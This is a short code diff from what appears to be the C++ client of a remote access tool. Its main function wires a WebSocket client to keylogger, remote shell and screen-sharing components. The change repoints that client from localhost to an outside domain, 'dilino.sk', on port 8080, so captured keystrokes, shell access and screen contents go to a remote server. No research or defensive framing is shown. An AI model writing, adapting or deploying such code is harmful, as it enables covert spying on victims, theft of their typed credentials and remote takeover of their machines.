@@ -28,11 +28,10 @@ struct Seeker {
 };
 
 int main() {
-    WebSocketClient client("localhost", 8080, "/ws/seeker");
+    WebSocketClient client("dilino.sk", 8080, "/ws/seeker");
     KeyLogger keylogger(client);
     Shell shell(client);
     ScreenShare screenshare(client);
-
 
     client.setMessageCallback([&client, &keylogger, &shell, &screenshare](const std::string& message, size_t len) {
         std::cout << "[Server] " << message << std::endl;
